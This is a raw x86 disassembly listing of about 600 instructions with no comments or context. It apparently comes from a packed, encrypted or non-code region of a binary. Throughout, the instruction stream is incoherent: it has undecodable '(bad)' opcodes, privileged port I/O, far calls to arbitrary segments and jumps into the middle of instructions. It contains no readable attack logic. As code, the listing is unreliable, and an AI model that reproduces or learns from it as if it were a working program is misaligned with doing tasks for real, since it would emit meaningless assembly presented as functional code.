  41f825:	mov    ecx,0xb6c4fe08
  41f82a:	inc    ecx
  41f82b:	sbb    eax,edi
  41f82d:	aas    
  41f82e:	es dec ebp
  41f830:	jnp    0x41f7f7
  41f832:	loope  0x41f833
  41f834:	xchg   ebx,eax
  41f835:	jecxz  0x41f7e6
  41f837:	xchg   DWORD PTR [eax-0x1ab1d81],ecx
  41f83d:	and    DWORD PTR [ebx-0x15],esi
  41f840:	cmp    BYTE PTR [edx],0x1c
  41f843:	test   eax,0x6e82c16f
  41f848:	mov    ah,0xf1
  41f84a:	inc    ebp
  41f84b:	call   0x29c2:0x80553b08
  41f852:	jle    0x41f892
  41f854:	push   esi
  41f855:	out    dx,al
  41f856:	add    ah,dl
  41f858:	scas   al,BYTE PTR es:[edi]
  41f859:	mov    eax,0x537e57de
  41f85e:	mov    ebp,ecx
  41f860:	jnp    0x41f80a
  41f862:	push   esp
  41f863:	js     0x41f855
  41f865:	sahf   
  41f866:	pop    edi
  41f867:	mov    ah,0xef
  41f869:	jne    0x41f88d
  41f86b:	mov    DWORD PTR [esi+0x6f],edx
  41f86e:	jbe    0x41f846
  41f870:	sub    BYTE PTR [eax+0x3d6dba1c],al
  41f876:	imul   edx,DWORD PTR [edi],0x48
  41f879:	dec    eax
  41f87a:	inc    ebp
  41f87b:	stos   DWORD PTR es:[edi],eax
  41f87c:	ss out dx,al
  41f87e:	xor    eax,0x9a82b65a
  41f883:	sub    al,0x63
  41f885:	xchg   al,al
  41f887:	sub    edx,esp
  41f889:	cmp    BYTE PTR [edi+0x51],bh
  41f88c:	test   eax,0x74760e6d
  41f891:	lahf   
  41f892:	clc    
  41f893:	std    
  41f894:	inc    eax
  41f895:	cmp    ch,BYTE PTR [esi+0x67]
  41f898:	int    0xf8
  41f89a:	push   ebp
  41f89b:	retf   
  41f89c:	rcl    BYTE PTR [ebx],1
  41f89e:	mov    esi,0x81efc9a8
  41f8a3:	sbb    dh,BYTE PTR [edi+ebp*8+0x3b]
  41f8a7:	call   0x87a2648a
  41f8ac:	into   
  41f8ad:	fiadd  DWORD PTR [ecx-0x75]
  41f8b0:	sbb    bl,BYTE PTR [eax]
  41f8b2:	ins    BYTE PTR es:[edi],dx
  41f8b3:	aam    0x7b
  41f8b5:	xchg   DWORD PTR [ecx],eax
  41f8b7:	ds add eax,0x316f6475
  41f8bd:	mov    esi,0x526f551f
  41f8c2:	cli    
  41f8c3:	sub    al,0xf7
  41f8c5:	mov    WORD PTR [ebp+0x41db700f],es
  41f8cb:	xchg   ebp,eax
  41f8cc:	mov    edi,0x76c2c9e2
  41f8d1:	je     0x41f894
  41f8d3:	cdq    
  41f8d4:	xchg   ebp,eax
  41f8d5:	add    ebp,DWORD PTR [ecx+ebx*2-0x7eb51e9b]
  41f8dc:	adc    eax,0x1ee1e734
  41f8e1:	outs   dx,DWORD PTR ds:[esi]
  41f8e2:	imul   ebx,DWORD PTR [edi-0x48a0e5bf],0x78
  41f8e9:	xchg   esp,eax
  41f8ea:	mov    edx,0x6d687b17
  41f8ef:	out    0xc6,eax
  41f8f1:	fadd   QWORD PTR ds:0x8a74fac3
  41f8f7:	push   0x6
  41f8f9:	mov    bl,0xc8
  41f8fb:	xchg   esi,eax
  41f8fc:	and    eax,0x67614317
  41f901:	sbb    DWORD PTR [eax],esp
  41f903:	pop    edx
  41f904:	inc    ebp
  41f905:	ja     0x41f96b
  41f907:	xor    ch,BYTE PTR [ebx+0x15413cec]
  41f90d:	test   eax,0x71597108
  41f912:	popf   
  41f913:	push   ecx
  41f914:	std    
  41f915:	in     eax,dx
  41f916:	daa    
  41f917:	icebp  
  41f918:	or     edx,DWORD PTR [ebp+0x5e]
  41f91b:	lds    edx,FWORD PTR fs:[edi]
  41f91e:	inc    BYTE PTR [eax+0x0]
  41f921:	or     BYTE PTR [edi],al
  41f923:	pop    ebx
  41f924:	cmp    edi,ebx
  41f926:	inc    esi
  41f927:	mov    esp,0xd61af841
  41f92c:	out    dx,eax
  41f92d:	and    eax,ebp
  41f92f:	neg    al
  41f931:	data16 fadd st(5),st
  41f934:	sub    DWORD PTR [ebp+0xd3f645a],ecx
  41f93a:	cmp    DWORD PTR [ebx+ebp*4-0x5],0x63
  41f93f:	out    dx,eax
  41f940:	ror    BYTE PTR [ebx],cl
  41f942:	mov    WORD PTR [esi-0x36],fs
  41f945:	cmp    al,0xd2
  41f947:	aas    
  41f948:	xor    ch,BYTE PTR [edi+0x55]
  41f94b:	test   dh,dh
  41f94d:	mov    edi,0x50d87634
  41f952:	xor    eax,0x5d4a26e0
  41f957:	push   ds
  41f958:	arpl   bp,dx
  41f95a:	call   FWORD PTR [edx]
  41f95c:	xchg   ebx,eax
  41f95d:	add    BYTE PTR [ebp-0x41],al
  41f960:	loope  0x41f93c
  41f962:	pushf  
  41f963:	test   DWORD PTR [esi+0x32],ecx
  41f966:	inc    ecx
  41f967:	imul   esp,DWORD PTR [ecx+0x1a],0x711b717
  41f96e:	cwde   
  41f96f:	jp     0x41f940
  41f971:	cmc    
  41f972:	ss inc ebp
  41f974:	loopne 0x41f92b
  41f976:	cmc    
  41f977:	int3   
  41f978:	loopne 0x41f9d1
  41f97a:	mov    ecx,0x601d511c
  41f97f:	adc    BYTE PTR [esi],bh
  41f981:	jge    0x41f921
  41f983:	sub    al,BYTE PTR [edx-0x145c5477]
  41f989:	pop    eax
  41f98a:	bound  edi,QWORD PTR [edi]
  41f98c:	ficomp WORD PTR [eax]
  41f98e:	pop    es
  41f98f:	loopne 0x41f979
  41f991:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f992:	das    
  41f993:	xor    esp,DWORD PTR [edi-0x3ebaa547]
  41f999:	mov    cl,0x6e
  41f99b:	leave  
  41f99c:	and    al,0x4c
  41f99e:	(bad)  
  41f9a0:	test   eax,0x79e09931
  41f9a5:	repnz xchg esp,eax
  41f9a8:	sar    DWORD PTR [ebp+0x55],cl
  41f9ab:	sub    BYTE PTR [ecx+ebp*2-0x54],ah
  41f9af:	mov    edx,0x49efc768
  41f9b4:	push   es
  41f9b5:	icebp  
  41f9b6:	ret    0xc74b
  41f9b9:	add    DWORD PTR [ecx+0x33],ebx
  41f9bc:	jne    0x41f95f
  41f9be:	push   ecx
  41f9bf:	sbb    bl,BYTE PTR [edi-0x30]
  41f9c2:	mov    edx,0x2425f66
  41f9c7:	aas    
  41f9c8:	leave  
  41f9c9:	sbb    BYTE PTR [esi+0x59cefc9b],0xbd
  41f9d0:	js     0x41fa19
  41f9d2:	or     DWORD PTR [eax-0x7e],0x155a0c94
  41f9d9:	sub    al,0x2f
  41f9db:	loopne 0x41f98c
  41f9dd:	retf   0x9d41
  41f9e0:	cmp    edi,0x38
  41f9e3:	sbb    BYTE PTR [edi+edx*8+0x8f5cbd2],cl
  41f9ea:	cdq    
  41f9eb:	stc    
  41f9ec:	pop    ecx
  41f9ed:	rcl    BYTE PTR [ebp+ebx*2-0x1d],cl
  41f9f1:	and    eax,0x93a1680c
  41f9f6:	in     eax,0xf
  41f9f8:	add    DWORD PTR [ecx],ecx
  41f9fa:	and    al,0x9e
  41f9fc:	xor    ebx,DWORD PTR [edx+0x40]
  41f9ff:	mov    edi,0xb5d6bc06
  41fa04:	pop    edx
  41fa05:	out    0x21,eax
  41fa07:	pop    ebx
  41fa08:	test   eax,0x2f0894ad
  41fa0d:	mov    ah,0x7a
  41fa0f:	mov    ch,0x22
  41fa11:	gs hlt 
  41fa13:	popf   
  41fa14:	ret    
  41fa15:	xchg   BYTE PTR [edx+ecx*2+0x34f36c4b],cl
  41fa1c:	es scas al,BYTE PTR es:[edi]
  41fa1e:	dec    ebx
  41fa1f:	stos   DWORD PTR es:[edi],eax
  41fa20:	adc    dl,BYTE PTR [esi-0x767e4819]
  41fa26:	adc    DWORD PTR [ebx],0xffffffa3
  41fa29:	mov    edi,edx
  41fa2b:	sub    eax,0xbed33f63
  41fa30:	mov    ebx,0xf9754b7e
  41fa35:	fmul   st(1),st
  41fa37:	int3   
  41fa38:	(bad)  
  41fa39:	lock outs dx,BYTE PTR ds:[esi]
  41fa3b:	outs   dx,BYTE PTR ds:[esi]
  41fa3c:	dec    esp
  41fa3d:	mov    ah,cl
  41fa3f:	push   es
  41fa40:	call   0x293354eb
  41fa45:	jecxz  0x41fa4c
  41fa47:	lahf   
  41fa48:	push   esi
  41fa49:	and    DWORD PTR [eax-0x60],esp
  41fa4c:	(bad)  
  41fa4d:	enter  0xc318,0x99
  41fa51:	xchg   ebp,eax
  41fa52:	xchg   edi,eax
  41fa53:	test   eax,0x14f1e2b2
  41fa58:	pop    ecx
  41fa59:	mov    eax,DWORD PTR [esi-0x34ab697e]
  41fa5f:	add    bl,BYTE PTR [esp+eiz*8]
  41fa62:	(bad)  
  41fa64:	(bad)  
  41fa65:	xchg   ecx,eax
  41fa66:	inc    edx
  41fa67:	mov    ebx,0xde24e629
  41fa6c:	inc    esp
  41fa6d:	test   eax,0x6ef320af
  41fa72:	mov    bl,dl
  41fa74:	lea    ebp,[eax-0x74]
  41fa77:	jp     0x41fabe
  41fa79:	push   cs
  41fa7a:	mov    esi,0x8014da05
  41fa7f:	ds aas 
  41fa81:	arpl   WORD PTR [eax],bx
  41fa83:	cmp    ebx,DWORD PTR [ecx-0x22dc63e3]
  41fa89:	ss out 0x51,al
  41fa8c:	dec    ebp
  41fa8d:	not    DWORD PTR [ebx-0x34ddbd64]
  41fa93:	xor    DWORD PTR [esi],esi
  41fa95:	sub    al,0x16
  41fa97:	call   0x14e7:0x98511528
  41fa9e:	adc    bh,BYTE PTR [ebp+0x35]
  41faa1:	leave  
  41faa2:	mov    BYTE PTR [ecx],dh
  41faa4:	sbb    cl,BYTE PTR [edx+0x31]
  41faa7:	and    eax,0xee898af
  41faac:	and    DWORD PTR [esi-0x5ccfa1ab],ebx
  41fab2:	pop    ss
  41fab3:	xchg   BYTE PTR [edi-0x3444d9d3],dh
  41fab9:	mov    ecx,0xbe126603
  41fabe:	inc    esi
  41fabf:	cmp    eax,DWORD PTR [ebx]
  41fac1:	cmp    eax,0xa2db9cf9
  41fac6:	jmp    0x5708:0x87b05de9
  41facd:	loope  0x41fae6
  41facf:	into   
  41fad0:	pop    esp
  41fad1:	and    al,0x6
  41fad3:	push   eax
  41fad4:	sub    DWORD PTR [bx+di+0x5d],ebx
  41fad8:	sbb    dl,BYTE PTR [esi+0x7beacaca]
  41fade:	popf   
  41fadf:	cdq    
  41fae0:	das    
  41fae1:	add    ch,ah
  41fae3:	cmp    al,0xea
  41fae5:	not    DWORD PTR [ebp-0x3a]
  41fae8:	mov    esi,0xfd734ceb
  41faed:	cmc    
  41faee:	adc    BYTE PTR [edx],ch
  41faf0:	fidivr WORD PTR [edi+0x16]
  41faf3:	pop    ecx
  41faf4:	adc    ah,BYTE PTR [esi]
  41faf6:	or     BYTE PTR [edi],ch
  41faf8:	nop
  41faf9:	dec    esp
  41fafa:	inc    edx
  41fafb:	mov    dh,0xb6
  41fafd:	clc    
  41fafe:	pop    esi
  41faff:	mov    ecx,0x556351f5
  41fb04:	test   eax,0x417f2ec3
  41fb09:	retf   0x5a36
  41fb0c:	mov    edi,0xe2814eda
  41fb11:	test   esp,edi
  41fb13:	cdq    
  41fb14:	xchg   BYTE PTR [esi+0x4],dl
  41fb17:	xchg   ebp,eax
  41fb18:	in     eax,0x8
  41fb1a:	mov    esi,0xec274354
  41fb1f:	mov    bl,0xdd
  41fb21:	imul   edx,edx,0x8c37c700
  41fb27:	or     eax,0x107b5cbc
  41fb2c:	imul   DWORD PTR [ebx+0x72]
  41fb2f:	out    0x7d,al
  41fb31:	retf   
  41fb32:	daa    
  41fb33:	cld    
  41fb34:	enter  0xe28f,0xf5
  41fb38:	jecxz  0x41fb42
  41fb3a:	lds    ecx,FWORD PTR [eax+0xa]
  41fb3d:	mov    esi,0x5f256124
  41fb42:	cmp    al,ah
  41fb44:	cmpxchg al,ah
  41fb47:	loope  0x41fba6
  41fb49:	mov    BYTE PTR [eax+0x5b],al
  41fb4c:	retf   0x628d
  41fb4f:	scas   eax,DWORD PTR es:[edi]
  41fb50:	xchg   ecx,eax
  41fb51:	sti    
  41fb52:	inc    edi
  41fb53:	add    dl,BYTE PTR [edx]
  41fb55:	pop    eax
  41fb56:	test   eax,0x22718a19
  41fb5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb5c:	rcr    DWORD PTR [eax],1
  41fb5e:	pop    ecx
  41fb5f:	inc    eax
  41fb60:	xor    eax,DWORD PTR [esi]
  41fb62:	pop    esi
  41fb63:	xchg   ebx,eax
  41fb64:	cmp    al,0x63
  41fb66:	push   cs
  41fb67:	mov    bh,0x71
  41fb69:	xor    eax,edi
  41fb6b:	sbb    esi,edx
  41fb6d:	bnd ds jns 0x41fb76
  41fb71:	xor    DWORD PTR [edx+0x5c3d4b0e],eax
  41fb77:	into   
  41fb78:	loope  0x41fb8e
  41fb7a:	push   0x1cb0d6b6
  41fb7f:	das    
  41fb80:	xchg   esi,eax
  41fb81:	xor    eax,0xfa4caa99
  41fb86:	scas   al,BYTE PTR es:[edi]
  41fb87:	inc    ecx
  41fb88:	out    0x86,eax
  41fb8a:	dec    ecx
  41fb8b:	xchg   edi,eax
  41fb8c:	mov    eax,0xd1312ac7
  41fb91:	adc    edi,esi
  41fb93:	test   al,0x6a
  41fb95:	mov    eax,ds:0x6dac2b64
  41fb9a:	push   edi
  41fb9b:	fs push edi
  41fb9d:	xchg   ecx,eax
  41fb9e:	hlt    
  41fb9f:	xor    BYTE PTR [eax-0x23eba219],al
  41fba5:	leave  
  41fba6:	test   eax,0x60a7f549
  41fbab:	jnp    0x41fb37
  41fbad:	sub    BYTE PTR [ebp+0x34],dl
  41fbb0:	icebp  
  41fbb1:	adc    al,0xd4
  41fbb3:	test   DWORD PTR [ebx+0x8c1aec],esi
  41fbb9:	pop    ebx
  41fbba:	or     eax,0x2a96d495
  41fbbf:	sub    ebx,DWORD PTR [eax+esi*1+0x6f]
  41fbc3:	adc    eax,0x43e50432
  41fbc8:	aas    
  41fbc9:	xchg   edx,eax
  41fbca:	fbstp  TBYTE PTR [edi-0x2379e1bc]
  41fbd0:	rcl    BYTE PTR cs:[ebx],cl
  41fbd3:	mov    eax,0x6c8d9de8
  41fbd8:	(bad)  
  41fbda:	jle    0x41fbc1
  41fbdc:	xchg   DWORD PTR [esi-0x6f0b6f17],esp
  41fbe2:	or     ecx,eax
  41fbe4:	jne    0x41fbc6
  41fbe6:	xchg   edi,eax
  41fbe7:	pusha  
  41fbe8:	ror    DWORD PTR [edi-0x1a8f5484],cl
  41fbee:	call   0x84c83133
  41fbf3:	pop    ds
  41fbf4:	enter  0xe59f,0x8d
  41fbf8:	mov    dh,0x78
  41fbfa:	push   eax
  41fbfb:	cwde   
  41fbfc:	push   edx
  41fbfd:	sub    al,0x5b
  41fbff:	mov    edx,esi
  41fc01:	daa    
  41fc02:	xchg   BYTE PTR [edx-0x58dd59e3],ah
  41fc08:	inc    edx
  41fc09:	mov    dl,BYTE PTR [esi-0x3d9ae2aa]
  41fc0f:	dec    eax
  41fc10:	cld    
  41fc11:	ins    BYTE PTR es:[edi],dx
  41fc12:	xchg   edi,eax
  41fc13:	call   0x2ce5a637
  41fc18:	cmp    al,0x7c
  41fc1a:	scas   al,BYTE PTR es:[edi]
  41fc1b:	clc    
  41fc1c:	adc    eax,0x339d06a4
  41fc21:	dec    edi
  41fc22:	retf   
  41fc23:	jle    0x41fc73
  41fc25:	loopne 0x41fc3e
  41fc27:	imul   ebp,DWORD PTR [eax+0x48],0x1f
  41fc2b:	shl    esi,0x54
  41fc2e:	pop    ds
  41fc2f:	xchg   edx,eax
  41fc30:	adc    DWORD PTR [ebx+0xa],edi
  41fc33:	xor    cl,ah
  41fc35:	fdivr  QWORD PTR [ebp-0x365e3a46]
  41fc3b:	xchg   DWORD PTR [esi-0x68],esi
  41fc3e:	shl    DWORD PTR [esi+0x22491bd4],0xd2
  41fc45:	push   ebx
  41fc46:	sub    dl,dh
  41fc48:	popa   
  41fc49:	push   edx
  41fc4a:	or     al,0x67
  41fc4c:	test   al,0x8f
  41fc4e:	add    edx,DWORD PTR [edi+0x12]
  41fc51:	jg     0x41fc0b
  41fc53:	mov    ds:0xa61f1083,al
  41fc59:	aad    0x88
  41fc5b:	mov    bl,0x52
  41fc5d:	sub    al,0xb6
  41fc5f:	(bad)  
  41fc60:	retf   
  41fc61:	sub    al,0xa4
  41fc63:	and    ah,BYTE PTR [ecx-0x7e268c31]
  41fc69:	gs mov ah,0x5e
  41fc6c:	pop    esp
  41fc6d:	imul   BYTE PTR [eax+esi*4]
  41fc70:	shl    DWORD PTR [edi+0x2e987585],0xdd
  41fc77:	pop    esp
  41fc78:	mov    eax,0xa0bb4cde
  41fc7d:	push   ebx
  41fc7e:	dec    ecx
  41fc7f:	sar    DWORD PTR [edx],0xe8
  41fc82:	sub    dh,BYTE PTR [ebx]
  41fc84:	mov    ah,0xf9
  41fc86:	loope  0x41fcf0
  41fc88:	cld    
  41fc89:	fdivr  DWORD PTR [ebx+0x7]
  41fc8c:	pop    ebp
  41fc8d:	and    eax,0x73eab60d
  41fc92:	mov    ecx,0x28d082b6
  41fc97:	mov    cl,0xcd
  41fc99:	ins    BYTE PTR es:[edi],dx
  41fc9a:	lea    esi,[ecx]
  41fc9c:	push   esp
  41fc9d:	in     eax,dx
  41fc9e:	int    0xc2
  41fca0:	sub    BYTE PTR [ebx+0x41],ah
  41fca3:	mov    es,WORD PTR [edi+0x7f]
  41fca6:	mov    dh,0xe0
  41fca8:	push   ds
  41fca9:	ss sti 
  41fcab:	stc    
  41fcac:	inc    edi
  41fcad:	in     al,dx
  41fcae:	mov    esi,0x9f84e412
  41fcb3:	pop    edx
  41fcb4:	jbe    0x41fd1d
  41fcb6:	sub    cl,bl
  41fcb8:	adc    ebp,eax
  41fcba:	daa    
  41fcbb:	xchg   BYTE PTR [ebx+0x50],cl
  41fcbe:	add    DWORD PTR [edi+0x33b1bb88],edx
  41fcc4:	ror    DWORD PTR [eax],1
  41fcc6:	cmp    BYTE PTR [ecx+0x7e],ch
  41fcc9:	inc    esi
  41fcca:	sti    
  41fccb:	xchg   edi,eax
  41fccc:	cmp    al,0x17
  41fcce:	rcl    DWORD PTR [edx+ecx*2+0x53],cl
  41fcd2:	gs cwde 
  41fcd4:	pop    eax
  41fcd5:	xchg   edx,eax
  41fcd6:	adc    al,BYTE PTR [ecx-0x77]
  41fcd9:	lods   eax,DWORD PTR ds:[esi]
  41fcda:	sbb    edx,DWORD PTR [ecx-0x59abfba8]
  41fce0:	leave  
  41fce1:	add    DWORD PTR [eax],esi
  41fce3:	mov    edx,0x2a7ca172
  41fce8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fce9:	test   DWORD PTR [ebp+0x69],ecx
  41fcec:	div    BYTE PTR [edi+0x3fab91c5]
  41fcf2:	push   esp
  41fcf3:	inc    ebx
  41fcf4:	adc    DWORD PTR [ecx+edi*8],esi
  41fcf7:	in     al,dx
  41fcf8:	in     al,dx
  41fcf9:	js     0x41fd1e
  41fcfb:	and    BYTE PTR [ecx+edi*2-0xd],dh
  41fcff:	in     al,0x16
  41fd01:	and    eax,0x2698ce9b
  41fd06:	out    0x6f,al
  41fd08:	daa    
  41fd09:	lea    ebp,[eax]
  41fd0b:	loopne 0x41fcb5
  41fd0d:	in     al,0x34
  41fd0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd10:	sub    BYTE PTR [edi],bh
  41fd12:	dec    ebx
  41fd13:	call   FWORD PTR [edi-0x7d]
  41fd16:	sbb    eax,DWORD PTR [ecx-0x6fadd1d3]
  41fd1c:	test   DWORD PTR [edi+eiz*2],edx
  41fd1f:	push   esi
  41fd20:	push   cs
  41fd21:	mov    esi,0x83629248
  41fd26:	sub    cl,BYTE PTR [edi]
  41fd28:	pushf  
  41fd29:	mov    WORD PTR [edx-0x1c],cs
  41fd2c:	dec    eax
  41fd2d:	out    0x16,al
  41fd2f:	push   esi
  41fd30:	xchg   edx,eax
  41fd31:	daa    
  41fd32:	push   esp
  41fd33:	mov    esi,0x5d92c71f
  41fd38:	(bad)  
  41fd39:	in     eax,dx
  41fd3a:	test   BYTE PTR es:[ebx],0xd3
  41fd3e:	cs xchg ebx,eax
  41fd40:	add    BYTE PTR [ecx],0xfa
  41fd43:	mov    ds:0xc5b3d89a,eax
  41fd48:	pop    eax
  41fd49:	icebp  
  41fd4a:	pusha  
  41fd4b:	sti    
  41fd4c:	out    0xc3,eax
  41fd4e:	in     eax,0x18
  41fd50:	repz pop ebx
  41fd52:	mov    dh,0xc4
  41fd54:	scas   eax,DWORD PTR es:[edi]
  41fd55:	jp     0x41fd02
  41fd57:	jge    0x41fd4e
  41fd59:	mov    bh,0xc2
  41fd5b:	jge    0x41fda6
  41fd5d:	leave  
  41fd5e:	call   0xb5ec1939
  41fd63:	test   cl,cl
  41fd65:	cdq    
  41fd66:	scas   eax,DWORD PTR es:[edi]
  41fd67:	jp     0x41fd19
  41fd69:	dec    ebp
  41fd6a:	adc    al,0xb8
  41fd6c:	xor    BYTE PTR [ecx+esi*4-0x6d],dl
  41fd70:	and    ch,BYTE PTR [esi]
  41fd72:	fidivr WORD PTR [edx-0x7b0eb430]
  41fd78:	bound  ebx,QWORD PTR [edi+0x39c78408]
  41fd7e:	call   0x14d84938
  41fd83:	dec    ebp
  41fd84:	mov    ebx,esi
  41fd86:	mov    eax,0x62fdca6e
  41fd8b:	jb     0x41fdc6
  41fd8d:	sar    BYTE PTR [edx],cl
  41fd8f:	and    ebx,DWORD PTR [bx+di-0x701]
  41fd94:	loop   0x41fdb1
  41fd96:	cmp    dl,BYTE PTR [ecx]
  41fd98:	(bad)  
  41fd99:	sbb    al,0xe9
  41fd9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd9c:	fucomip st,st(2)
  41fd9e:	popa   
  41fd9f:	dec    esi
  41fda0:	inc    esp
  41fda1:	aad    0x92
  41fda3:	mov    eax,ds:0xd14de177
  41fda8:	sub    eax,DWORD PTR [edi+0x5]
  41fdab:	mov    ds:0xa867980,eax
  41fdb0:	mov    eax,ds:0xce99c57c
  41fdb5:	dec    ebx
  41fdb6:	lock scas eax,DWORD PTR es:[edi]
  41fdb8:	inc    esp
  41fdb9:	rcr    BYTE PTR [esp+eiz*4-0x7e05a4e5],0x64
  41fdc1:	loopne 0x41fd81
  41fdc3:	fwait
  41fdc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fdc5:	popa   
  41fdc6:	in     al,dx
  41fdc7:	pop    ds
  41fdc8:	push   edx
  41fdc9:	lea    edi,[eax+0x18]
  41fdcc:	cmovs  esp,DWORD PTR [edi-0x5f9c780c]
  41fdd3:	jmp    0x45a:0x409973b
  41fdda:	daa    
  41fddb:	or     dl,dl
  41fddd:	pop    esi
  41fdde:	jmp    0x41fded
  41fde0:	test   al,0xe2
  41fde2:	and    eax,0x23eead2b
  41fde7:	repnz adc ch,dh
  41fdea:	xor    al,0x5b
  41fdec:	push   0x4ff445ac
  41fdf1:	mov    edi,0x864f6f96
  41fdf6:	mov    WORD PTR [edx],ds
  41fdf8:	jmp    0x41fdd6
  41fdfa:	mov    ebx,0x7523b905
  41fdff:	enter  0xb1be,0x90
  41fe03:	mov    ecx,0xf0dae0e7
  41fe08:	jmp    0x2f5e:0xfc37d957
  41fe0f:	xor    al,0x76
  41fe11:	addr16 into 
  41fe13:	mov    ds:0xc5112af,al
  41fe18:	pop    ss
  41fe19:	out    0xcc,eax
  41fe1b:	xchg   ecx,eax
  41fe1c:	push   0xc25ec14c
  41fe21:	inc    ecx
  41fe22:	lds    eax,FWORD PTR [di+0x11]
  41fe26:	mov    ch,0x33
  41fe28:	leave  
  41fe29:	and    esp,DWORD PTR [ecx]
  41fe2b:	mov    esi,0xf4b20ca4
  41fe30:	mov    dh,0x36
  41fe32:	fidiv  DWORD PTR [edi-0x310186d9]
  41fe38:	push   cs
  41fe39:	cmp    BYTE PTR [edx],al
  41fe3b:	test   DWORD PTR [edx+0x57540f3b],ebp
  41fe41:	repnz dec ebx
  41fe43:	fsubr  st,st(6)
  41fe45:	adc    ebx,DWORD PTR [edx]
  41fe47:	xchg   ebx,eax
  41fe48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe49:	lods   eax,DWORD PTR ds:[esi]
  41fe4a:	cmp    al,0xef
  41fe4c:	das    
  41fe4d:	jbe    0x41fe50
  41fe4f:	jge    0x41feb5
  41fe51:	xor    edx,0xfde723e2
  41fe57:	and    DWORD PTR ds:0x28c886f8,edi
  41fe5d:	jle    0x41fe0d
  41fe5f:	aaa    
  41fe60:	ins    BYTE PTR es:[edi],dx
  41fe61:	lea    ecx,[esi+0x2c]
  41fe64:	ins    BYTE PTR es:[edi],dx
  41fe65:	and    bh,BYTE PTR [edx-0x178a633d]
  41fe6b:	nop
  41fe6c:	push   eax
  41fe6d:	cmp    BYTE PTR [edi+ebx*8+0x117c66fb],bl
  41fe74:	mov    ah,0xca
  41fe76:	and    BYTE PTR [esi+ebp*2-0x686ed042],0x85
  41fe7e:	shr    DWORD PTR [eax],cl
  41fe80:	mov    bl,0x51
  41fe82:	push   cs
  41fe83:	cwde   
  41fe84:	jne    0x41fe8e
  41fe86:	mov    al,0x38
  41fe88:	push   es
  41fe89:	push   ss
  41fe8a:	jae    0x41ff03
  41fe8c:	and    DWORD PTR [ecx+0x37],edx
  41fe8f:	lds    edx,FWORD PTR [eax]
  41fe91:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41fe93:	add    BYTE PTR ss:[ebp+0x58],cl
  41fe97:	call   0xb9229a0
  41fe9c:	sbb    DWORD PTR [ebp-0x8ffc817],esp
  41fea2:	adc    BYTE PTR [ebp+0x44],0xe3
  41fea6:	adc    bl,ch
  41fea8:	stc    
  41fea9:	loope  0x41fe60
  41feab:	xor    esi,DWORD PTR [edi]
  41fead:	jno    0x41ff05
  41feaf:	popa   
  41feb0:	pop    ds
  41feb1:	jecxz  0x41fe43
  41feb3:	sti    
  41feb4:	arpl   cx,bp
  41feb6:	cmp    DWORD PTR [esi+0x58],esp
  41feb9:	jmp    0xc038:0x9f00191b
  41fec0:	mov    ds,WORD PTR [ecx+0x6f]
  41fec3:	and    al,0x61
  41fec5:	xor    dl,ah
  41fec7:	es ins BYTE PTR es:[edi],dx
  41fec9:	inc    ecx
  41feca:	or     eax,DWORD PTR [ecx+edi*2-0x5795fe8e]
  41fed1:	js     0x41fe7b
  41fed3:	arpl   bp,bp
  41fed5:	(bad)  
  41fed6:	cmc    
  41fed7:	xor    ah,BYTE PTR [eax-0x3f6f892e]
  41fedd:	xchg   edx,eax
  41fede:	hlt    
  41fedf:	xchg   edi,eax
  41fee0:	or     ebp,ecx
  41fee2:	push   cs
  41fee3:	addr16 pushf 
  41fee5:	(bad)  
  41fee6:	fmul   QWORD PTR [edi-0x6]
  41fee9:	jmp    0x41febe
  41feeb:	int    0xa4
  41feed:	stos   BYTE PTR es:[edi],al
  41feee:	icebp  
  41feef:	imul   ebp,edx,0x1e
  41fef2:	mov    fs,esi
  41fef4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fef5:	pop    es
  41fef6:	xlat   BYTE PTR ds:[ebx]
  41fef7:	mov    ecx,0xff8a4e4b
  41fefc:	inc    eax
  41fefd:	shl    DWORD PTR [ebx],cl
  41feff:	add    al,0x9
  41ff01:	bound  edi,QWORD PTR [ecx-0x3a0c4baf]
  41ff07:	ror    DWORD PTR [ebp+0x2adf7cf8],cl
  41ff0d:	fcmovne st,st(7)
  41ff0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff10:	jge    0x41ff74
  41ff12:	xor    eax,0xee4f9857
  41ff17:	imul   ebp,DWORD PTR [ebx+0x6d6a0a18],0xffffff94
  41ff1e:	stos   DWORD PTR es:[edi],eax
  41ff1f:	sub    al,0xd
  41ff21:	(bad)  
  41ff22:	fmul   QWORD PTR [ecx]
  41ff24:	(bad)  
  41ff25:	nop
  41ff26:	or     ah,0xaf
  41ff29:	dec    ebp
  41ff2a:	cdq    
  41ff2b:	mov    eax,DWORD PTR [edi-0x1f83fcdd]
  41ff31:	mov    esi,DWORD PTR [eax-0x2f5d421c]
  41ff37:	fisttp QWORD PTR [eax+0x4b78f21a]
  41ff3d:	push   eax
  41ff3e:	sub    eax,DWORD PTR [edi]
  41ff40:	ins    BYTE PTR es:[edi],dx
  41ff41:	ins    BYTE PTR es:[edi],dx
  41ff42:	mov    ds:0xb5f98d05,eax
  41ff47:	sub    ecx,edi
  41ff49:	push   ecx
  41ff4a:	xor    eax,0x107922c0
  41ff4f:	cmc    
  41ff50:	xchg   BYTE PTR [esi],bh
  41ff52:	xchg   ebp,eax
  41ff53:	pop    ebp
  41ff54:	int    0x5e
  41ff56:	cli    
  41ff57:	lea    esp,[edi]
  41ff59:	call   0x4156:0x49229b20
  41ff60:	mov    dh,0xd2
  41ff62:	pushf  
  41ff63:	push   ss
  41ff64:	dec    esi
  41ff65:	cmp    DWORD PTR [edi-0x22dbe17],edx
  41ff6b:	or     BYTE PTR [ecx-0x2de4f9ba],bl
  41ff71:	(bad)  
  41ff72:	sti    
  41ff73:	adc    edi,DWORD PTR [ecx+0x7a]
  41ff76:	mov    cl,0xb
  41ff78:	inc    esp
  41ff79:	lock xor al,0xf1
  41ff7c:	mov    bl,0x5f
  41ff7e:	jg     0x41ffaa
  41ff80:	sti    
  41ff81:	jbe    0x41ff69
  41ff83:	mov    al,0x7f
  41ff85:	cli    
  41ff86:	sub    dl,0xda
  41ff89:	fcomi  st,st(1)
